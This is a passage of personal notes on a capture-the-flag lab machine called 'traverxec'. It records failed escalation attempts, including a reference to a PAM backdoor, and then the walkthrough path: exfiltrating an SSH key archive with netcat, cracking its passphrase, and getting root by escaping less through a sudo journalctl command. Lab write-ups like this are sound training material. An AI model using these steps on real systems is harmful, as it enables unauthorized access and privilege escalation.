www-data@traverxec:/tmp$ nano shell.sh
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue
Error opening terminal: unknown.
```

- this also highlighted vulnerable sudo version
- I attempted to exploit this, but I need to know the password for the current user account www-data
- Proc 755 with ppid 1 is run by user www-data but the ppid user is root
Proc 932 with ppid 1 is run by user www-data but the ppid user is root

- I think possibly exploiting PAM or the above PROC may be possible for priv esc https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation
	- https://github.com/zephrax/linux-pam-backdoor
	- I'm just having trouble figuring out what version of PAM is running. I need to know that if I'm going to backdoor it.


# 12/12/2023
- just a note here - can pretty reliably get into /tmp now. Not sure what the issue was before. Perhaps something with sending the command without a proper shell? Either way, it's been reliable ever since I started spawning a bash shell with python. 

I admitted defeat here for now, went to guided mode and used the walkthrough. The "intended" path is to enumerate the nostromo config at `/var/nostromo/conf/nhttpd.conf`

- From here, we can see the server homedir is set to `/home/david/public_www`
- if we ls that folder, we dig until we find `/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz`
- we then exfil that tgz file with netcat to our attacking machine
- we expand the archive and find that ssh keys are inside
- we attempt to use the stolen ssh key to ssh into traverxec server, but it prompts for a passphrase
- we crack this passphrase with ssh2john and john the ripper
- we successfully use the ssh file and cracked passphrase to auth as david via ssh
- we are able to obtain the user flag here
- to escalate privileges, we review david's home folder and find a folder called `bin`
- inside `bin` is `server-stats.sh`
- we cat this file and find it runs journalctl as sudo
	- `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat`
- remove the stuff after the pipe `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`
- this will spawn less as sudo. From there you can issue `!/bin/bash` to escape less and have shell as root. 
	- NOTE - there was a small hiccup here for me where if I issued the command to spawn less, it would run entirely and end. I would not get an opportunity to issue the less escape `!/bin/bash`. The fix for this was to resize my terminal to a smaller size. I think the reason is is that less is will auto close out if your terminal displays all available data (doesn't need to wait on you for input). So if your terminal is big enough to fit everything, less runs, but then just closes out because it doesn't need to do anything. Whereas if you have a screen that is too small, it will launch less and stay there, waiting for your input because there is more to display than what can fit in the terminal. 


Completed!